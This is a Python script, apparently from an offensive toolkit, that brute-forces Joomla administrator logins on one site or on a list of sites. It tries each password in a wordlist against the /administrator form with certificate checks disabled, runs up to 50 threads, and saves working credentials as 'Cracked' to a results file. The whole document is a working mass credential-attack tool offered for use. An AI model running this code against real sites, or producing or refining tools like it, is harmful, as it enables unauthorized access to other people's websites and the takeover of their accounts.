import werkzeug
werkzeug.cached_property = werkzeug.utils.cached_property
from robobrowser import RoboBrowser
import re, sys, time, threading, warnings
from models.control import save as SV
from models.output import *
if not sys.warnoptions:
    warnings.simplefilter("ignore")

class color:
    r = '\033[91m'
    g = '\033[92m'
    y = '\033[93m'
    b = '\033[0m'

def get_target_urls():
    target_type = input("[1] Single\n[2] Mass\nChoose target type (1 or 2): ")
    targets = []
    if target_type == '1':
        url = input("Enter the target URL (without /administrator): ")
        targets.append(url.strip())
    elif target_type == '2':
        file_path = input("Enter the path to the target list file: ")
        try:
            with open(file_path, 'r') as f:
                targets = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"{error} Can't find {file_path}. Does it exist?")
            sys.exit(1)
    else:
        print("{error} Invalid choice. Please choose 1 or 2.")
        sys.exit(1)
    return targets

def DoTheThing(url, username, password):
    try:
        robot = RoboBrowser(history=False)
        full_url = f"{url}/administrator"
        robot.open(full_url, verify=False)

        form = robot.get_form()

        # Cek jika form ada
        if form is None:
            print(f"{error} Login form not found at {full_url}.{white}")
            return

        form['username'].value = username
        form['passwd'].value = password.strip()
        robot.submit_form(form)

        response = robot.find_all(text=re.compile('users'))
        someText = re.search("users", str(response))

        if someText:
            print(f"{suc} Cracked: {white}{username} : {password.strip()} ===> {magenta}{url}{white}")
            SV("joomla_success", f"{url} ==> {username}:{password}")
        else:
            print(f"{error} Trying: {white}{username} : {password.strip()} ===> {magenta}{url}{white}")
    except Exception as e:
        print(f"{error} Error: {e}{white}")


def worker(url, username, pass_list):
    for password in pass_list:
        DoTheThing(url, username, password)

def main():
    targets = get_target_urls()
    username = input("Enter the username: ")
    wordlist = input("Enter the path to the password list: ")

    try:
        with open(wordlist, 'r') as f:
            pass_list = f.readlines()
        print(f'{info} Using password wordlist {magenta}{wordlist}{white} and username {magenta}{username}.{white}')

        threads = []
        for target in targets:
            t = threading.Thread(target=worker, args=(target, username, pass_list))
            t.start()
            threads.append(t)
            if len(threads) >= 50: 
                for thread in threads:
                    thread.join()
                threads = []

        for thread in threads: 
            thread.join()

        print(f"{info} Finished!")
        print(f"{info} Save result to result/joomla_success.txt")
    except FileNotFoundError:
        print(f"{error} Can't find {wordlist}. Does it exist?")
        sys.exit(1)

if __name__ == "__main__":
    main()
